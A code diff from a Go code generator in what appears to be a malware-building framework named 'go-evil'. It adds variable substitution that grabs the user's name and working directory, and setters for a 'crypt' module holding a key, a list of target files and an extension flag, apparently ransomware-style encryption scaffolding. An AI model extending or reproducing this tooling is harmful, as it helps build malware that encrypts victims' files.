@@ -34,20 +34,24 @@ func generate_runtime_variable(s_json string) string {
 
 		"if len(result) > 0 {",
 
-		"i_number := tools.String_to_int(result[0][1])",
+		"i_number := tools.String_to_int(result[0][2])",
 		"if i_number != -1 {",
 		"if i_number > 0 && i_number < 5 {",
-		"toReturn = obj.get(line)",
+		"toReturn = obj.values[i_number-1]",
 		"}else if i_number == 666 { toReturn = tools.Grab_username()",
 		"} else if i_number == 39 { toReturn = tools.Grab_CWD()",
 		"} else if i_number == 13 { toReturn = obj.foreach",
-		"} else { toReturn = \"NULL\" }}}",
+		"} else { toReturn = \"NULL\" }",
+
+		"toReturn = strings.ReplaceAll(line, result[0][1], toReturn)",
+		"}}",
 		"return toReturn }"})
 
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	data_object.Add_go_import("regexp")
+	data_object.Add_go_import("strings")
 
-	data_object.Add_go_const("GRAB_VAR = \"€([0-9]+)€\"")
+	data_object.Add_go_const("GRAB_VAR = \"(€([0-9]+)€)\"")
 
 	return structure.Send(data_object)
 }
@@ -65,12 +69,24 @@ func generate_crypt(s_json string) string {
 		"crypto_method string",
 		"target []string",
 		"key string",
+		"key_length int",
 		"extension bool",
 		"}"})
 
 	data_object.Add_go_function([]string{
 		"func (obj *crypt_t) set_crypto(value string) {",
 		"obj.crypto_method = value",
+		"}"})
+
+	data_object.Add_go_function([]string{
+		"func (obj *crypt_t) set_key(value string) {",
+		"obj.key = value",
+		"obj.key_length = len(value)",
+		"}"})
+
+	data_object.Add_go_function([]string{
+		"func (obj *crypt_t) add_target(value string) {",
+		"obj.target = append(obj.target, value)",
 		"}"})
 
 	return structure.Send(data_object)
